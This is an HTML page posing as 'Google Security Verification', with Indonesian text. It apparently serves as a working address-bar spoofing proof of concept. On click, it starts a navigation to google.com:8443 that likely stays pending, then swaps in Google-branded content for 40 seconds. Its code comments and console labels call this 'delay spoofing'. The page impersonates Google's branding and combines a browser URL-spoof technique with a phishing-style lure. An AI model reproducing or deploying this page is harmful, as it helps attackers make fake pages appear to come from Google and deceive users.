<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; white-space: pre-wrap; text-align: left; max-height: 160px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
  <button id="startBtn">Verify Account</button>
  <div id="status">[*] Ready...</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');
  var t0 = performance.now();
  var ticks = 0;
  var active = false;

  function log(msg) {
    var elapsed = (performance.now() - t0).toFixed(1);
    var line = `[+${elapsed}ms] ${msg}`;
    statusEl.textContent = line;
    console.log("[Delay Spoof] " + line);
  }

  document.addEventListener('visibilitychange', function () {
    log("visibilitychange -> hidden=" + document.hidden + ", state=" + document.visibilityState);
  });

  window.addEventListener('pagehide', function (e) {
    active = false;
    log("pagehide -> persisted=" + e.persisted + ", ticks=" + ticks);
  });

  function raceTick(source) {
    if (!active) return;
    ticks++;
    if (ticks % 200 === 0) {
      log("delay_40s (" + source + ") -> ticks=" + ticks);
    }
  }

  function raceLoop() {
    if (!active) return;
    raceTick("rAF");
    queueMicrotask(function () {
      if (active) raceTick("microtask");
    });
    requestAnimationFrame(raceLoop);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', function() {
    active = true;
    ticks = 0;
    log("[*] Memulai delay spoofing (40s)...");
    requestAnimationFrame(raceLoop);

    // ============================================
    // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
    // ============================================
    try {
      window.location.href = "https://www.google.com:8443";
    } catch (e) {
      active = false;
      log("[-] Redirect error: " + e.message);
    }

    // ============================================
    // 3. SELAMA DELAY 40 DETIK, PANTAU STATUS DIAGNOSIS
    // ============================================
    setTimeout(function() {
      if (!active) return;
      document.body.innerHTML = `
        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
          <h2 style="color:#333;margin-bottom:10px;">40s Pending Probe</h2>
          <p style="color:#666;font-size:14px;margin-bottom:20px;">Observing 40-second delay toward https://www.google.com:8443</p>
          <div id="probeInfo" style="font-family:monospace;font-size:12px;color:#333;background:#f4f4f4;padding:12px;border-radius:6px;">Active delay ticks: ${ticks}</div>
          <div style="margin-top:15px;font-size:11px;color:#666;">40-second diagnostic delay test.</div>
        </div>
      `;

      // Jeda 40000ms (40 detik) sebelum alih ke https://www.google.com
      setTimeout(function() {
        active = false;
        window.location.href = 'https://www.google.com:8443';
      }, 40000);

      log("[+] Probe aktif dengan delay 40 detik...");
    }, 1000);

  }, { once: true });

})();
</script>

</body>
</html>
